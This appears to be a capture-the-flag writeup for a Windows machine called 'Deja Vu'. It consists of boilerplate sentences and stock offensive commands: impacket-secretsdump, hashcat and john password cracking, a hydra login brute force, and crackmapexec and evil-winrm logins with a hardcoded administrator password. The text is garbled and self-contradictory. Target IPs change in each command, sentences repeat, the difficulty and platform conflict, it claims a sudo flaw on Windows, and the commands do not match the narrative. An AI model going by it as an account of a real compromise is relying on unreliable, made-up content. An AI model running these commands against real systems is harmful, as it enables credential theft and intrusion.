---
TitleSEO: "PwnTillDawn — Deja Vu (Insane Windows) | ZureFX"
TitlePost: "PwnTillDawn — Deja Vu (Insane Windows)"
Author: "ZureFX"
Description: "Full writeup for PwnTillDawn Deja Vu. Sudo Misconfiguration and SQL Injection to achieve insane compromise on Windows."
Keywords: "active directory, reversing, ctf, easy, windows"
URL: "https://zurefx.github.io/writeups/htb-deja-vu-631.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-deja-vu-631/"
Date: "2025-07-09"
Tags: "Active Directory, Reversing, CTF, Easy, Windows"
Section: "writeups"
Lang: "en"
main_img: "htb-deja-vu-631"
Permalink: "/writeups/htb-deja-vu-631.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Deja Vu** is rated **Insane** on PwnTillDawn. It runs **Windows** and the IP address during this analysis was `10.71.207.73`.

### Objectives

Command injection was possible through unsanitized user input in the search functionality. Authentication bypass was achieved through careful manipulation of the login mechanism.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
gobuster dir -u http://10.56.101.208/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.103.200.66/FUZZ
```

The web application was vulnerable to Server-Side Template Injection (SSTI). Command injection was possible through unsanitized user input in the search functionality.

### Service Enumeration

Post-exploitation enumeration revealed a path to domain administrator privileges. Weak file permissions allowed modification of critical system files. Lateral movement was facilitated by reusing discovered credentials across services.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.71.82.57/FUZZ
nmap -sCV -p3268,22,9200 10.22.254.112 -oN scan.txt
```

The scheduled task ran with elevated privileges and could be abused for escalation. Privilege escalation was possible due to misconfigured sudo permissions.

### SMB Enumeration

The kernel version was outdated and vulnerable to a publicly known exploit. Weak file permissions allowed modification of critical system files.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.82.3.229
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.98.8.180/FUZZ
gobuster dir -u http://10.41.13.208/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

Token impersonation allowed elevation to SYSTEM privileges on the target. Network traffic analysis revealed unencrypted communications containing user credentials. Network traffic analysis revealed unencrypted communications containing user credentials.

## Exploitation

### Vulnerability Identification

The backup files contained sensitive information that should not have been accessible. The database credentials were hardcoded in the application source code. The scheduled task ran with elevated privileges and could be abused for escalation.

Key finding: **Sudo Misconfiguration**.

Weak file permissions allowed modification of critical system files. Network traffic analysis revealed unencrypted communications containing user credentials.

### Initial Access

Post-exploitation enumeration revealed a path to domain administrator privileges. Initial enumeration revealed several interesting open ports on the target.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
crackmapexec smb 10.79.88.193 -u administrator -p 'P@ssw0rd!' --shares
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.57.40.234 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
evil-winrm -i 10.45.195.217 -u administrator -p 'P@ssw0rd!'
```

The target system was identified as running a vulnerable version of the service. Network traffic analysis revealed unencrypted communications containing user credentials. Group Policy Preferences contained encrypted but recoverable credentials.

## Privilege Escalation

### Enumeration

Authentication bypass was achieved through careful manipulation of the login mechanism. The scheduled task ran with elevated privileges and could be abused for escalation. Command injection was possible through unsanitized user input in the search functionality.

```powershell
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.115.39.84 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

### Exploitation

The application stored sensitive credentials in an unencrypted configuration file. The target system was identified as running a vulnerable version of the service.

```powershell
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.65.219.197 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
feroxbuster -h
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.16.169.229/FUZZ
```

Unconstrained delegation was enabled on the compromised machine. Token impersonation allowed elevation to SYSTEM privileges on the target.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

The backup files contained sensitive information that should not have been accessible. Initial enumeration revealed several interesting open ports on the target.

## Summary

### Tools Used

- `ligolo-ng`
- `burpsuite`
- `gobuster`
- `GetNPUsers`
- `crackmapexec`
- `socat`
- `wmiexec`

### Key Takeaways

- Sudo Misconfiguration
- SQL Injection
